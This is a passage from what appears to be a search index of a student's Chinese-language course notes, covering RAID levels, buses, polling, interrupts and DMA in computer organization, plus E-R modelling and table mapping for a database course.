<p>\u5982\u4f55\u63d0\u9ad8 Availability \uff1f\uff1f\uff1f\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528\u78c1\u76d8\u9635\u5217\uff0c\u5229\u7528\u5197\u4f59\u6765\u589e\u52a0\u78c1\u76d8\u5b58\u50a8\u7684\u53ef\u7528\u6027\uff0c\u4f8b\u5982 Redundant Arrays of Inexpensive Disks(RAID):</p> RAID Level \u5141\u8bb8\u51e0\u4e2a\u76d8\u635f\u574f \u6570\u636e\u76d8\u4e2a\u6570 \u6821\u9a8c\u76d8\u4e2a\u6570 \u6ce8\u91ca 0 Non-redundant striped 0 8 0 \u4ec5\u628a\u6570\u636e\u5206\u6563\u5230\u591a\u4e2a\u78c1\u76d8\u4e0a 1 Mirrored 1 8 8 \u6bcf\u4e00\u4e2a\u76d8\u5bf9\u5e94\u4e00\u4e2a\u6821\u9a8c\u76d8\uff0c\u5373\u955c\u50cf 2 Memory-style ECC 1 8 4 \u8def\u8fb9\u4e5f\u591f\uff0c\u65e0\u4eba\u95ee\u6d25 3 Bit-interleaved parity 1 8 1 \u4f4d\u4ea4\u53c9\u5947\u5076\u6821\u9a8c 4 Block-interleaved parity 1 8 1 \u5757\u4ea4\u53c9\u5947\u5076\u6821\u9a8c 5 Block-interleaved parity distributed parity 1 8 1 \u5206\u5e03\u5f0f\u5757\u4ea4\u53c9\u5947\u5076\u6821\u9a8c\uff0c\u6821\u9a8c\u5757\u5206\u5e03\u4e8e\u5404\u4e2a\u6570\u636e\u76d8\u4e4b\u4e2d 6 P+Q redundancy 2 8 2 \u4e8c\u6b21\u6821\u9a8c\u5757\u6280\u672f\uff0c\u9700\u8981\u591a\u4e00\u500d\u6821\u9a8c\u76d8 <p>\u76ee\u524d\u6700\u5e38\u7528\u7684\u662f RAID 0 \u548c RAID 5</p> <p>RAID 3 \u4f4d\u4ea4\u53c9\u5947\u5076\u6821\u9a8c</p> <p></p> <p>\u6821\u9a8c\u4f4d\u7b49\u4e8e\u6240\u6709\u6570\u636e\u76d8\u5bf9\u5e94\u4f4d\u7684\u5947\u51fd\u6570\u3002\u5f53\u6709\u4e00\u4e2a\u76d8\u635f\u574f\u65f6\uff0c\u901a\u8fc7\u5176\u5b83\u51e0\u4e2a\u6570\u636e\u76d8\u4ee5\u53ca\u6821\u9a8c\u76d8\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u6062\u590d\u635f\u574f\u7684\u6570\u636e\u3002</p> <p>\u7f3a\u70b9\u5728\u4e8e\u5bf9\u6821\u9a8c\u76d8\u7684\u8bfb\u5199\u662f\u6700\u9891\u7e41\u7684\uff0c\u56e0\u6b64\u6821\u9a8c\u76d8\u624d\u662f\u6700\u5bb9\u6613\u635f\u574f\u7684\uff0c\u8fd9\u4e2a\u95ee\u9898\u5728 RAID 5\u4e2d\u6709\u6240\u6539\u5584\u3002</p> <p>RAID 5 \u5206\u5e03\u5f0f\u5757\u4ea4\u53c9\u5947\u5076\u6821\u9a8c</p> <p></p> <p>\u76f8\u6bd4\u4e8e RAID 3,4\uff0c\u5176\u4f18\u70b9\u8fd8\u6709\u53ef\u4ee5\u540c\u65f6\u5199\u4e24\u4e2a\u78c1\u76d8\uff0c\u5c0f\u6570\u636e\u5199\u6548\u7387\u66f4\u9ad8\u3002</p> <p>\u8bfe\u672c\u9898\u76ee\uff1a Which of the following are true about RAID levels 1,3,4,5 and 6?</p> <ul> <li>(True) RAID systems rely on redundancy to achieve high availability</li> <li>(True) RAID 1 (mirroring) has the higheset check disk overhead</li> <li>(True) For small writes, RAID 3 has the worst throughput</li> <li>(True) For large writes, RAID 3,4 and 5 have the same throughput</li> </ul> <p>\u7531\u4e8e\u53ef\u4ee5\u540c\u65f6\u8bfb\u5199\u591a\u4e2a\u78c1\u76d8\uff0c\u5373\u4fbf\u662f RAID 0 \u4e5f\u589e\u52a0\u4e86\u6570\u636e\u5927\u89c4\u6a21\u8bbf\u95ee\u7684\u6027\u80fd\u3002</p>"},{"location":"Courses/CO/Chapter6/#mio-bus","title":"MIO Bus","text":""},{"location":"Courses/CO/Chapter6/#bus-basics","title":"Bus Basics","text":"<p>\u4e0d\u540c\u7684\u5b50\u7cfb\u7edf\u9700\u8981\u5177\u6709\u8fde\u63a5\u5f7c\u6b64\u7684\u63a5\u53e3\uff0c\u8fd9\u4e2a\u5de5\u4f5c\u901a\u5e38\u7531\u603b\u7ebf\u5b8c\u6210\u3002\u603b\u7ebf\u662f\u4e00\u6761\u5171\u4eab\u7684\u901a\u4fe1\u94fe\u8def\uff0c\u5176\u5e26\u5bbd\u9650\u5236\u4e86I/O\u7684\u6700\u5927\u541e\u5410\u91cf\uff0c\u56e0\u6b64\u603b\u7ebf\u7cfb\u7edf\u7684\u8bbe\u8ba1\u4e5f\u662f\u8ba1\u7b97\u673a\u7cfb\u7edf\u4f18\u5316\u7684\u5173\u952e\u3002</p> <p>Bus \u5305\u542b\u4e24\u79cd lines:</p> <ul> <li>Control lines: \u4f20\u9012\u8bf7\u6c42\u548c\u63a7\u5236\u4fe1\u53f7\uff0c\u5e76\u8868\u793a\u6570\u636e\u7ebf\u4fe1\u606f\u7684\u7c7b\u578b</li> <li>Data lines: \u4f20\u8f93\u4fe1\u606f\uff08\u5305\u62ec data\u3001address\u3001command\uff09<ul> <li>\u4e00\u4e9b\u603b\u7ebf\u4f1a\u7528\u4e24\u5957\u7ebf\u8def\u5206\u522b\u4f20\u8f93\u6570\u636e\u548c\u5730\u5740</li> </ul> </li> </ul> <p>\u603b\u7ebf\u901a\u4fe1\u7684\u57fa\u672c\u65b9\u5f0f\u5206\u4e3a\u540c\u6b65\u548c\u5f02\u6b65\u3002\u5982\u679c\u603b\u7ebf\u662f\u540c\u6b65\u7684\uff0c\u63a7\u5236\u7ebf\u4e0a\u5c31\u6709\u4e00\u4e2a\u65f6\u949f\u4ee5\u53ca\u4e0e\u65f6\u949f\u76f8\u5173\u7684\u56fa\u5b9a\u901a\u4fe1\u534f\u8bae\uff0c\u8fd9\u79cd\u534f\u8bae\u662f\u9884\u5148\u786e\u5b9a\u7684\uff0c\u8bbe\u8ba1\u8f83\u5c11\u903b\u8f91\u63a7\u5236\uff0c\u6240\u4ee5\u603b\u7ebf\u53ef\u4ee5\u8fd0\u884c\u5f88\u5feb\uff0c\u4e14\u63a5\u53e3\u4e0a\u7684\u903b\u8f91\u7535\u8def\u4e5f\u6bd4\u8f83\u5c11\u3002</p> <p>\u540c\u6b65\u603b\u7ebf\u7684\u7f3a\u70b9\u5728\u4e8e\u603b\u7ebf\u4e0a\u6240\u6709\u8bbe\u5907\u90fd\u5fc5\u987b\u8fd0\u884c\u5728\u540c\u4e00\u65f6\u949f\u5468\u671f\u9891\u7387\u4e0b\uff0c\u4e14\u7531\u4e8e\u65f6\u949f\u504f\u5dee\u539f\u56e0\uff0c\u540c\u6b65\u603b\u7ebf\u7684\u957f\u5ea6\u4e0d\u80fd\u592a\u957f\u3002</p> <p>\u5904\u7406\u5668-\u5185\u5b58\u603b\u7ebf\u901a\u5e38\u662f\u540c\u6b65\u7684\uff0c\u56e0\u4e3a\u8bbe\u5907\u901a\u4fe1\u8ddd\u79bb\u77ed\u3001\u6570\u91cf\u5c11\uff0c\u65f6\u949f\u9891\u7387\u9ad8</p> <p>\u5f02\u6b65\u603b\u7ebf\u4e0d\u9700\u8981\u65f6\u949f\uff0c\u56e0\u6b64\u5b83\u53ef\u4ee5\u9002\u5e94\u66f4\u591a\u8bbe\u5907\u3002\u4e3a\u4e86\u534f\u8c03\u53d1\u9001\u8005\u548c\u63a5\u6536\u8005\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u8f93\uff0c\u5f02\u6b65\u603b\u7ebf\u91c7\u7528\u63e1\u624b\u534f\u8bae\uff0c\u53ea\u6709\u5f53\u53d1\u9001\u8005\u548c\u63a5\u6536\u8005\u8fbe\u6210\u4e00\u81f4\u65f6\uff0c\u624d\u80fd\u8fdb\u884c\u4e0b\u4e00\u6b65\u3002</p> <p>\u5f02\u6b65\u63e1\u624b\u793a\u4f8b</p> <p></p>"},{"location":"Courses/CO/Chapter6/#communication-with-processor","title":"Communication with Processor","text":"<p>1. Polling</p> <p>\u5904\u7406\u5668\u5468\u671f\u6027\u68c0\u67e5I/O\u8bbe\u5907\u5bc4\u5b58\u5668\u7684\u72b6\u6001\u4f4d\u6765\u51b3\u5b9a\u80fd\u5426\u6267\u884c\u4e0b\u4e00\u4e2aI/O\u64cd\u4f5c\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u79f0\u4e3a\u8f6e\u8be2\u3002</p> <p>\u8f6e\u8be2\u662fI/O\u8bbe\u5907\u4e0e\u5904\u7406\u5668\u901a\u4fe1\u6700\u7b80\u5355\u7684\u65b9\u5f0f\uff0cI/O\u8bbe\u5907\u5728\u5b8c\u6210\u5de5\u4f5c\u540e\u66f4\u6539\u72b6\u6001\u5bc4\u5b58\u5668\uff0c\u800c\u5904\u7406\u5668\u901a\u8fc7\u8bbf\u95ee\u8fd9\u4e2a\u5bc4\u5b58\u5668\u4ece\u800c\u5b8c\u5168\u63a7\u5236\u548c\u6267\u884c\u6240\u6709\u8fd9\u4e9b\u5de5\u4f5c\u3002</p> <p>\u5bf9\u4e8e\u5b9e\u65f6\u5d4c\u5165\u5f0f\u7cfb\u7edf\uff0c\u7531\u4e8e\u5176I/O\u901f\u5ea6\u662f\u9884\u5b9a\u7684\uff0cI/O\u5f00\u9500\u662f\u53ef\u9884\u6d4b\u7684\uff0c\u56e0\u6b64\u8f6e\u8be2\u662f\u4e00\u4e2a\u7b80\u5355\u65b9\u4fbf\u7684\u7b56\u7565\u3002\u4f46\u662f\u8f6e\u8be2\u7f3a\u70b9\u5728\u4e8e\u5b83\u6d6a\u8d39\u4e86\u5927\u91cf\u5904\u7406\u5668\u65f6\u95f4\uff0c\u56e0\u4e3a\u5904\u7406\u5668\u7684\u901f\u5ea6\u8981\u6bd4I/O\u8bbe\u5907\u5feb\u7684\u591a\u3002\u4e00\u4e2a\u8f83\u6162I/O\u64cd\u4f5c\u671f\u95f4\uff0c\u5904\u7406\u5668\u4f1a\u591a\u6b21\u8bbf\u95ee\u72b6\u6001\u5bc4\u5b58\u5668\u3002</p> <p>2. Interrupt</p> <p>\u4e2d\u65ad\u9a71\u52a8I/O\u65b9\u5f0f\u51e0\u4e4e\u88ab\u6240\u6709\u7cfb\u7edf\u4f7f\u7528\uff0c\u5f53\u4e00\u4e2aI/O\u8bbe\u5907\u60f3\u8981\u901a\u77e5\u5904\u7406\u5668\u5b83\u5df2\u7ecf\u5b8c\u6210\u67d0\u79cd\u64cd\u4f5c\u6216\u53d1\u751f\u67d0\u4e9b\u9519\u8bef\u65f6\uff0c\u5c31\u4f1a\u5411\u5904\u7406\u5668\u53d1\u9001\u4e2d\u65ad\u4fe1\u53f7\uff0c\u5f15\u8d77\u5904\u7406\u5668\u4e2d\u65ad\u3002\u4e2d\u65ad\u673a\u5236\u6d88\u9664\u4e86\u5904\u7406\u5668\u8f6e\u8be2\u8bbe\u5907\u7684\u9700\u6c42\uff0c\u4ece\u800c\u4f7f\u5904\u7406\u5668\u80fd\u591f\u96c6\u4e2d\u7cbe\u529b\u8fd0\u884c\u7a0b\u5e8f\u3002</p> <p>\u4e2d\u65ad\u662f\u5f02\u6b65\u7684\uff0c\u63a7\u5236\u5355\u5143\u53ea\u9700\u8981\u5728\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4\u524d\u68c0\u67e5\u662f\u5426\u6709\u672a\u51b3\u7684\u4e2d\u65ad\u5373\u53ef</p> <p>\u5f53\u6570\u636e\u6b63\u5728\u4ece\u8bbe\u5907\u6216\u5411\u8bbe\u5907\u4e2d\u4f20\u8f93\u65f6\uff0c\u7cfb\u7edf\u53ef\u4ee5\u8fdb\u884c\u522b\u7684\u5de5\u4f5c\u3002\u5f53\u6570\u636e\u4f20\u8f93\u5b8c\u6210\uff0c\u8bbe\u5907\u53d1\u9001\u4e00\u4e2aI/O\u4e2d\u65ad\u4fe1\u53f7\uff0c\u5904\u7406\u5668\u518d\u68c0\u67e5\u72b6\u6001\u5bc4\u5b58\u5668\u7b49\u64cd\u4f5c\u3002</p> <p>Polling \u548c Interrupt \u4f20\u8f93\u6570\u636e\u7684\u65b9\u5f0f\u90fd\u662f\u4ee5\u8f83\u5c0f Unit \u6216 Chunk \u4e3a\u5355\u4f4d\u4f20\u8f93\u7684</p> <p>3. DMA</p> <p>\u5f53I/O\u8bbe\u5907\u4e0e\u5185\u5b58\u9700\u8981\u4f20\u8f93\u6570\u636e\u65f6\uff0c\u6570\u636e\u90fd\u9700\u8981\u7ecf\u8fc7\u5904\u7406\u5668\u624d\u80fd\u5230\u8fbe\u5bf9\u65b9\u3002\u5c3d\u7ba1\u6211\u4eec\u4f7f\u7528\u4e2d\u65ad\u7684\u65b9\u5f0f\u9a71\u52a8\u6570\u636e\u4f20\u8f93\uff0cI/O\u8bbe\u5907\u4e0e\u5904\u7406\u5668\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u6d88\u8017\u7684\u5904\u7406\u5668\u65f6\u95f4\u4ecd\u7136\u662f\u96be\u4ee5\u63a5\u53d7\u7684\u3002\u56e0\u6b64\u6211\u4eec\u6709\u4e00\u79cd\u4e0d\u9700\u8981\u5904\u7406\u5668\uff0c\u800c\u8ba9\u8bbe\u5907\u63a7\u5236\u5668\u76f4\u63a5\u5411\u5185\u5b58\u6216\u4ece\u5185\u5b58\u4f20\u8f93\u6570\u636e\u7684\u673a\u5236\uff0c\u79f0\u4e3a\u76f4\u63a5\u5185\u5b58\u8bbf\u95ee(Direct Memory Access)</p> <p>\u8bbe\u5907\u548c\u5904\u7406\u5668\u901a\u4fe1\u65f6\u4ecd\u7136\u91c7\u7528I/O\u4e2d\u65ad\uff0c\u4f46\u4ec5\u9650I/O\u64cd\u4f5c\u5b8c\u6210\u6216\u51fa\u73b0\u9519\u8bef\u65f6</p> <p>\u8bfe\u4ef6\u4f8b\u9898</p> <p>\u5047\u5b9a\u6211\u4eec\u6709\u4e00\u4e2a\u8f6e\u8be2\u64cd\u4f5c\u9700\u8981 400 \u65f6\u949f\u5468\u671f\u7684 500-Mhz \u7684\u5904\u7406\u5668\uff0c\u5bf9\u4e8e\u4ee5\u4e0b\u4e09\u4e2a\u8bbe\u5907\uff1a</p> <ul> <li>&lt;1&gt; \u9700\u8981\u8f6e\u8be2\u9f20\u6807\u6bcf\u79d230\u6b21\u4ee5\u4fdd\u8bc1\u7528\u6237\u7684\u64cd\u4f5c\u4e0d\u4f1a\u4e22\u5931</li> <li>&lt;2&gt; \u8f6f\u76d8(Floppy Disk)\u4e0e\u5904\u7406\u5668\u4f20\u8f93\u6570\u636e\u4ee5 16-bit unit \u4e3a\u5355\u4f4d\uff0c\u5e76\u4e14\u5b83\u7684\u4f20\u8f93\u901f\u5ea6\u4e3a \\(50KB/s\\) \u4f7f\u5f97\u6570\u636e\u4f20\u8f93\u6ca1\u6709\u9057\u6f0f</li> <li>&lt;3&gt; \u786c\u76d8\u4e0e\u5904\u7406\u5668\u4f20\u8f93\u6570\u636e\u4ee5 4-word chunk \u4e3a\u5355\u4f4d\uff0c\u5e76\u4e14\u5b83\u7684\u4f20\u8f93\u901f\u5ea6\u4e3a \\(4MB/s\\) \u4f7f\u5f97\u6570\u636e\u4f20\u8f93\u6ca1\u6709\u9057\u6f0f</li> </ul> Mouse Floppy Disk Hard Disk \u6bcf\u79d2\u8f6e\u8be2\u5360\u7528\u5468\u671f\u6570 \\(30\\times 400\\) \\(\\frac{50KB}{16bit}\\times 400\\) \\(\\frac{4MB}{16B}\\times 400\\) \u8f6e\u8be2\u65f6\u95f4\u5360\u603b\u65f6\u95f4\u7684\u6bd4\u4f8b 0.002% 2% 20% <p>\u4ece\u6570\u636e\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0c\u8981\u4fdd\u8bc1\u786c\u76d8\u6570\u636e\u4f20\u8f93\u4e0d\u4e22\u5931\u6570\u636e\uff0c\u5904\u7406\u5668\u5355\u4f4d\u65f6\u95f4\u5185\u5f97\u6709 0.2s \u7528\u6765\u8fdb\u884c\u8f6e\u8be2\u64cd\u4f5c\uff0c\u8fd9\u662f\u96be\u4ee5\u63a5\u53d7\u7684\u6027\u80fd\u635f\u5931\u3002</p> <p>\u5bf9\u4e8e\u540c\u6837\u7684CPU\u548c\u786c\u76d8\uff0c\u6211\u4eec\u5bf9\u6bd4\u4f7f\u7528\u4e2d\u65ad\u9a71\u52a8\u7684\u65b9\u5f0f\u67e5\u770b\u6570\u636e\u4f20\u8f93\u8fd9\u4e00\u64cd\u4f5c\u5360\u5904\u7406\u5668\u603b\u65f6\u95f4\u7684\u6bd4\u4f8b\u3002\u5176\u4e2d\uff0c\u6211\u4eec\u8ba4\u4e3a\u5904\u7406\u5668\u53ea\u6709 5% \u7684\u65f6\u95f4\u9700\u8981\u7528\u5230\u786c\u76d8\u7684\u6570\u636e\uff0c\u800c\u4e2d\u65ad\u4fe1\u53f7\u7684\u4f20\u8f93\u4e0e\u5904\u7406\u603b\u5171\u9700\u8981 500 \u4e2a\u65f6\u949f\u5468\u671f\u3002</p> <p>\u7531\u4e8e\u786c\u76d8\u5728\u6bcf\u4f20\u8f93\u5b8c\u4e00\u4e2a Chunk \u65f6\u90fd\u4f1a\u53d1\u9001\u4e00\u4e2a\u4e2d\u65ad\u4fe1\u53f7\u7ed9\u5904\u7406\u5668\uff0c\u8868\u793a\u8be5 Chunk \u4f20\u8f93\u5b8c\u6210\u4ee5\u63d0\u9192\u4e0b\u4e00\u4e2a Chunk \u7684\u4f20\u8f93\uff0c\u6240\u4ee5\u5355\u4f4d\u65f6\u95f4\u5185\u786c\u76d8\u53d1\u9001\u7684\u4e2d\u65ad\u4fe1\u53f7\u6240\u5360\u65f6\u949f\u5468\u671f\u6570\u4e3a\uff1a</p> \\[\\begin{array}l \\frac{4MB}{16B} \\times 500 \\times 5\\% =6.25\\times 10^6\\\\ \\Rightarrow \\frac{6.25\\times 10^6}{ 500\\times 10^6} \\times 100\\% =1.25\\% \\end{array}\\] <p>\u8f6e\u8be2\u9700\u8981\u4e0d\u95f4\u65ad\u8fdb\u884c\u4ee5\u4fdd\u8bc1\u4e0d\u9519\u8fc7\u4fe1\u53f7\uff0c\u800c\u4e2d\u65ad\u53ea\u5728\u9700\u8981\u6570\u636e\u65f6\u8bbf\u95ee\u78c1\u76d8</p> <p>\u4ecd\u7136\u662f\u4e0a\u9762\u7684\u5904\u7406\u5668\u548c\u786c\u76d8\uff0c\u6211\u4eec\u4f7f\u7528DMA\u4f5c\u4e3a\u6570\u636e\u4f20\u8f93\u7b56\u7565\uff0c\u5047\u5b9a\uff1a</p> <ul> <li>Initial Setup of a DMA Transfer \u9700\u8981 1000 \u4e2a\u65f6\u949f\u5468\u671f</li> <li>Handling Interrupt of DMA Completion \u9700\u8981 500 \u4e2a\u65f6\u949f\u5468\u671f</li> <li>Average Transfer from Disk \u4e3a 8KB</li> <li>\u786c\u76d8\u5168\u7a0b\u4fdd\u6301\u4f20\u8f93\u6570\u636e\u72b6\u6001</li> </ul> <p>\u90a3\u4e48\uff1a</p> <p></p>"},{"location":"Courses/DB/","title":"Index","text":"<p> \u7ea6 113 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>\u7b80\u5355\u8bc4\u4ef7\u4e0b\u8fd9\u95e8\u8bfe</p> <p>\u5185\u5bb9\u6bd4\u8f83\u5b9e\u5728\uff0c\u8fd8\u662f\u63a8\u8350\u542c\u7684\u3002minisql \u65b9\u9762\u9664\u4e86 B+ Index \u96be\u5ea6\u90fd\u4e0d\u7b97\u592a\u9ad8\uff0c\u5355\u4eba\u5b8c\u6210\u5b8c\u5168\u53ef\u884c\u300224-25 \u6625\u590f\u5b66\u671f\u671f\u672b\u8003\u7684\u770b\u4e0a\u53bb\u6bd4\u8f83\u4e00\u822c\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u5760\u673a\u4e86\ud83d\ude02\u3002</p>"},{"location":"Courses/DB/#_1","title":"\u5206\u6570\u6784\u6210","text":"<ul> <li>Assignments/Exercises 10%</li> <li>Course Quiz 10%</li> <li>Experiments and Experimental Project 30%</li> <li>Final Examination 50%</li> </ul> <p>\u671f\u672b\u534a\u5f00\u5377\uff0c\u53ef\u5e26\u4e00\u5f20 A4 \u7eb8</p>"},{"location":"Courses/DB/#reference","title":"Reference","text":"<ul> <li>Min-Babel Library</li> <li>HobbitQia \u7684\u7b14\u8bb0\u672c</li> </ul>"},{"location":"Courses/DB/#a4","title":"A4 \u7eb8\u53c2\u8003","text":""},{"location":"Courses/DB/Entity-Relationship%20Model/","title":"Entity-Relationship Model","text":""},{"location":"Courses/DB/Entity-Relationship%20Model/#entity-relationship-model","title":"Entity-Relationship Model","text":"<p> \u7ea6 893 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p>"},{"location":"Courses/DB/Entity-Relationship%20Model/#e-r-diagrams","title":"E-R Diagrams","text":"<p>https://www.drawio.com/</p> <p>\u5728 E-R \u56fe\u4e2d\uff1a</p> <ul> <li>Rectangles\uff1a\u65b9\u5f62\u6846\u8868\u793a Entities Set\uff0c\u6846\u5185\u5185\u5bb9\u5373\u4e3a\u5176 attributes\u3002.</li> <li>Ellipses\uff1a\u692d\u5706\u8868\u793a attributes\uff0c\u4f46\u662f\u4e00\u822c\u90fd\u653e\u8fdb Entities Set \u5185\u4e86\uff0c\u4e0d\u5355\u72ec\u753b\u51fa</li> <li>Diamonds\uff1a\u83f1\u5f62\u6846\u8868\u793a Relationship Set</li> </ul>"},{"location":"Courses/DB/Entity-Relationship%20Model/#attributes","title":"Attributes","text":"<p>\u4e00\u4e2a entity \u53ef\u7531 attribute \u7684\u96c6\u5408\u8868\u793a\uff0cattribute \u53ef\u5141\u8bb8\u7684\u53d6\u503c\u8303\u56f4\u88ab\u79f0\u4e3a Domain\u3002attribute \u53ef\u5212\u5206\u4e3a\uff1a</p> <ul> <li>&lt;1&gt; Simple / Composite Attributes<ul> <li>\u590d\u5408\u5c5e\u6027\u4f8b\u5982 name\uff0c\u7531 first name\uff0clast name \u590d\u5408\u5f97\u5230</li> </ul> </li> <li>&lt;2&gt; Single-valued / Multi-valued Attributes<ul> <li>\u591a\u503c\u5c5e\u6027\u4f8b\u5982 phone\uff0c\u53ef\u7531\u591a\u4e2a\u7535\u8bdd\u53f7\u7801\u7ec4\u6210</li> </ul> </li> <li>&lt;3&gt; Derived Attributes<ul> <li>\u76f8\u5bf9\u4e8e Base Attribute \u6d3e\u751f\u51fa\u6765\u7684\u5c5e\u6027\uff0c\u4f8b\u5982 age \u7531 birthday \u6d3e\u751f</li> </ul> </li> </ul> <p>\u5728 E-R \u56fe\u4e2d\uff0c\u4e0d\u540c\u7c7b\u578b\u7684\u5c5e\u6027\u8868\u793a\u65b9\u6cd5\u5982\u4e0b\uff1a</p> E-R DiagramEntity(\u4ec5\u4f5c\u4e3a\u5b9e\u4f53\u8868\u793a) <p></p> <p></p>"},{"location":"Courses/DB/Entity-Relationship%20Model/#cardinality-participation-constraints","title":"Cardinality &amp; Participation Constraints","text":"<p>Mapping Cardinality Constraints \u9650\u5b9a\u4e86\u4e00\u4e2a\u5b9e\u4f53\u4e0e\u5173\u7cfb\u53e6\u4e00\u7aef\u7684\u5b9e\u4f53\u53ef\u80fd\u5173\u8054\u7684\u6570\u76ee\u4e0a\u9650\uff1a</p> One-to-One RelationshipOne-to-Many RelationshipMany-to-One RelationshipMany-to-Many Relationship <p></p> <p></p> <p></p> <p></p> <p>\u5168\u53c2\u4e0e\u548c\u90e8\u5206\u53c2\u4e0e\u7ea6\u675f\u53cd\u6620\u4e86\u4e00\u4e2a\u5b9e\u4f53\u53c2\u4e0e\u5173\u8054\u7684\u6570\u76ee\u4e0b\u9650\u662f 1 \u6b21\u8fd8\u662f 0 \u6b21\uff0c\u5728 E-R \u56fe\u4e2d\u5206\u522b\u7528 Double Line \u548c Line \u8868\u793a\uff1a</p> <p></p>"},{"location":"Courses/DB/Entity-Relationship%20Model/#weak-entity-sets","title":"Weak Entity Sets","text":"<p>\u4e0d\u5b58\u5728\u5b8c\u6574\u7684 Primary Key \u7684\u5b9e\u4f53\u96c6\u79f0\u4e3a Weak Entity Set\u3002Weak Entity Set \u9700\u8981\u4f9d\u8d56\u53e6\u4e00\u4e2a\u5b9e\u4f53\u96c6\u624d\u80fd\u5b58\u5728\uff0c\u4e0e\u53e6\u4e00\u4e2a\u5b9e\u4f53\u96c6\u7684\u4e00\u4e9b Attributes \u7ec4\u5408\u5f62\u6210\u5b83\u7684 Primary Key\u3002\u5176\u4e2d\u4f4d\u4e8e Weak Entity Set \u4e2d\u7684 Attributes \u79f0\u4e3adiscriminator\u6216\u8005partial key\u3002</p> <p>\u5728 E-R \u56fe\u4e2d\uff0c\u6211\u4eec\u5728 discriminator \u4e0b\u9762\u6dfb\u52a0 dash line(\u865a\u7ebf)\uff0c\u8bbe\u7f6e Weak Entity Set \u7684 Identifying Relationship \u4e3a double diamond\uff1a</p> <p></p> <p>\u5bf9\u4e8e\u4e0a\u56fe\u5173\u7cfb\uff0c\u6211\u4eec\u8ba4\u4e3a\u5f31\u5b9e\u4f53\u96c6\u7684 Primary Key \u4e3a <code>(course_id, sec_id, semester, year)</code>\u3002</p> <p>Weak Entity Set \u4e00\u5b9a\u662f\u591a\u5bf9\u4e00\u3001\u5168\u53c2\u4e0e\u7684\uff0c\u56e0\u6b64\u4e0a\u56fe\u91c7\u7528\u7bad\u5934\u4e0e\u53cc\u6a2a\u7ebf</p> <p>E-R Design \u4f8b\u9898</p> <p>\u4e3a\u5916\u5356\u5e73\u53f0\u7ed8\u5236 E-R \u56fe\uff08\u5177\u4f53\u8981\u6c42\u7701\u7565\uff09\uff1a</p> <p></p>"},{"location":"Courses/DB/Entity-Relationship%20Model/#extended-e-r-features","title":"Extended E-R features","text":"<p>Specialization \u7279\u6b8a\u5316\u3001\u5177\u4f53\u5316</p> <p>Specialization \u662f\u4e00\u79cd Top-down \u8bbe\u8ba1\u65b9\u6cd5\uff0c\u7c7b\u4f3c\u4e8e\u9762\u5411\u5bf9\u8c61\u7684\u7ee7\u627f\u7279\u6027\u3002lower-level \u7684\u5b9e\u4f53\u96c6\u4f1a\u7ee7\u627f high-level \u5b9e\u4f53\u96c6\u7684\u6240\u6709\u5c5e\u6027\uff0c\u5e76\u4e14\u53ef\u4ee5\u62e5\u6709\u81ea\u5df1\u989d\u5916\u7684\u5c5e\u6027\u4ee5\u53ca\u5173\u7cfb\u3002</p> E-R 1E-R 2 <p></p> <p></p> <p>ISA \u5728\u6570\u636e\u5e93\u8bed\u4e49\u4e2d\u8868\u793a\u4e3a\"is a\"\uff0c\u8868\u793a\u7236\u7c7b\u548c\u5b50\u7c7b\u7684\u8054\u7cfb</p> <p>\u5728\u4e0a E-R 1 \u4e2d\uff0c\u5982\u679c ISA \u65c1\u6709 <code>disjoint</code> \uff0c\u5219\u8868\u793a\u5b50\u7c7b\u4e4b\u95f4\u662f\u4e0d\u76f8\u4ea4\u7684\uff0c\u4e00\u4e2a\u5b9e\u4f53\u53ea\u80fd\u5c5e\u4e8e\u4e00\u4e2a\u5b50\u5b9e\u4f53\u96c6\uff1b\u5426\u5219\uff0c\u5219\u9ed8\u8ba4\u4e3a <code>overlapping</code>\uff0c\u5373\u5b50\u7c7b\u4e4b\u95f4\u662f\u53ef\u91cd\u53e0\u7684\uff0c\u4e00\u4e2a\u5b9e\u4f53\u53ef\u4ee5\u5c5e\u4e8e\u591a\u4e2a\u5b50\u5b9e\u4f53\u96c6\u3002</p> <p>Generalization \u6cdb\u5316\u3001\u666e\u904d\u5316</p> <p>Generalization \u662f\u4e00\u79cd Bottom-Up \u8bbe\u8ba1\u65b9\u6cd5\uff0c\u5176\u7279\u70b9\u662f\u7ec4\u5408\u62e5\u6709\u76f8\u540c features \u7684\u5b9e\u4f53\u96c6\uff0c\u5f62\u6210 higher-level entity set\u3002</p> <p>Specialization \u548c Generalization \u53ea\u662f\u666e\u901a\u7684\u5012\u7f6e\uff0c\u56e0\u6b64\u5728 E-R \u56fe\u4e0a\uff0c\u5b83\u4eec\u7684\u8868\u793a\u5b8c\u5168\u76f8\u540c\u3002</p>"},{"location":"Courses/DB/Entity-Relationship%20Model/#e-r-to-tables","title":"E-R to Tables","text":"<ul> <li>Composite Attributes \u62c6\u5206\u6210\u591a\u4e2a Separate Attributes<ul> <li>\u4f8b\u5982\uff0c<code>address</code> \u62c6\u4e3a <code>address.city</code>, <code>address.state</code></li> </ul> </li> <li>Multi-Valued Attributes \u7528\u5355\u72ec\u4e00\u4e2a Tables \u5b58\u50a8<ul> <li>\u4f8b\u5982\uff0c\u5c06\u5b9e\u4f53\u96c6 <code>user(id, phone_number)</code> \u8f6c\u6362\u6210\u4e0b\u9762\u4e24\u4e2a Table</li> <li><code>user(id)</code></li> <li><code>user_phone(id, phone_number)</code> Primary Key \u4e3a <code>(id, phone_number)</code></li> </ul> </li> <li>Many-to-One/One-to-Many \u53ef\u4ee5\u9009\u62e9\u5c06\u201c\u5173\u7cfb\u201d\u5bf9\u5e94\u7684 Table \u5408\u5e76\u5230 Many \u7aef\u5b9e\u4f53\u96c6\u5bf9\u5e94\u7684 Table \u4e2d<ul> <li>\u4f8b\u5982\uff0c\u6211\u4eec\u6709\u4e09\u4e2a Table\uff1a<code>account(account_number, balance)</code>, <code>branch(branch_name, assets)</code>, <code>account_branch(account_number, branch_name)</code>\u3002\u5176\u4e2d account \u548c branch 